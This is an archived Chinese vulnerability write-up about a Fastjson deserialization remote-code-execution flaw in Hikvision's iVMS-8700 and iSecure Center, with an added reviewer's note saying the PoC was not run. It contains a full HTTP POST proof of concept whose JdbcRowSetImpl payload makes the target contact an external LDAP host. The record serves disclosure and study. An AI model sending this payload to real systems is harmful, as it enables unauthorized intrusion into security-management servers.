---
source: "MrWQ/vulnerability-paper"
id: "vw-4b3301c9c5a59133ba18bf16"
entity_id: "ve-4b3301c9c5a59133ba18bf16"
schema_version: "1"
title: "海康威视综合安防管理平台远程命令执行漏洞（Fastjson）"
product: "Hikvision iVMS-8700及iSecure Center"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "iVMS2.0.0–2.9.2、iSecure1.0.0–1.7.0声称范围，JNDI/JDK条件未给"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88Fastjson%EF%BC%89.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据；回连样例可能向外部地址发送网络请求或建立会话；应使用自己的隔离回连服务，DNS/LDAP 到达只能证明相应交互，不能单独证明 RCE"
source_url: "https://mp.weixin.qq.com/s/b3V-p8eUL1ycJIFKefQryA"
source_status: "recorded"
---

# 海康威视综合安防管理平台远程命令执行漏洞（Fastjson）

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Hikvision iVMS-8700及iSecure Center
- 本文讨论：bic/ssoService/v1/applyCT反序列化
- 版本、权限与配置前提：iVMS2.0.0–2.9.2、iSecure1.0.0–1.7.0声称范围，JNDI/JDK条件未给
- 资料类型：Fastjson请求复现；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- LDAP/DNS回连只能支持JNDI行为，不能无条件证明RCE
- 反弹shell引至WebLogic文章，缺本组件/JDK可用链条件
- 修复链接命令注入公告与本Fastjson缺陷映射不明
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据
- 回连样例可能向外部地址发送网络请求或建立会话；应使用自己的隔离回连服务，DNS/LDAP 到达只能证明相应交互，不能单独证明 RCE

### 待核与来源

- 官方版本矩阵、Fastjson/JDK配置及执行证据待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/b3V-p8eUL1ycJIFKefQryA)

  

网安引领时代，弥天点亮未来 

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x00 写在前面**  

  

**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x01 漏洞介绍**  

海康威视部分综合安防管理平台管理平台基于 "统一软件技术架构" 理念设计，采用业务组件化技术，满足平台在业务上的弹性扩展。该平台适用于全行业通用综合安防业务，对各系统资源进行了整合和集中管理，实现统一部署、配置、管理和调度。
================================================================================================================

该平台存在 **Fastjson** 远程命令执行漏洞，攻击者可通过构造恶意 Payload 执行并获取服务器系统权限以及敏感数据信息。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x02 影响版本**  

  

V2.0.0 <= iVMS-8700 <= V2.9.2      V1.0.0 <= iSecure Center <= V1.7.0

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x03 漏洞复现**  

  

1. 访问漏洞环境

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBnHyLw2NRtyfdglib2BRw4m72bXCBgWFo8EOHJf8hnQ5jXUQoWfwOgNiaDp0EQyEc0UttVza3zV1qA/640?wx_fmt=png)

2. 对漏洞进行复现

 **Poc （POST）**

```http
POST /bic/ssoService/v1/applyCT HTTP/1.1
Host: 127.0.0.1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers
Content-Type: application/json
Content-Length: 204
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://kjvqweuoav.dnstunnel.run","autoCommit":true},"hfe4zyyzldp":"="}

```

漏洞复现

POST 请求，响应存在漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBnHyLw2NRtyfdglib2BRw4mHibib9fVVXI5GRvibEsx1XnlACPzhB4AmVZWu5chO58vUz5ib1Zo0gbMQw/640?wx_fmt=png)

        burp 生成测试域名

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBnHyLw2NRtyfdglib2BRw4mIr0TIuzXkZBr1LX9DgwoEGTVT4ibET2tzJtkiauyCwPKM762S5O7jRjw/640?wx_fmt=png)

3. 反弹 shell 参考这篇文章。

[https://mp.weixin.qq.com/s/0pNLJZXFTPSbXy4TLWZxKQ](http://mp.weixin.qq.com/s?__biz=MzU2NDgzOTQzNw==&mid=2247497068&idx=1&sn=fff335b0aa2427588270a7168625f07c&chksm=fc46600ecb31e9183201a681432a36a6576ed39c5c5e24aef26fb775e7abccbdbd90ca74d92d&scene=21#wechat_redirect)  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x04 修复建议**  

  

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

```
https://www.hikvision.com/en/support/cybersecurity/security-advisory/security-notification-command-injection-vulnerability-in-some-hikvision-products/

```

弥天简介

学海浩茫，予以风动，必降弥天之润！弥天弥天安全实验室成立于 2019 年 2 月 19 日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。

口号 网安引领时代，弥天点亮未来

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 

知识分享完了

喜欢别忘了关注我们哦~

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
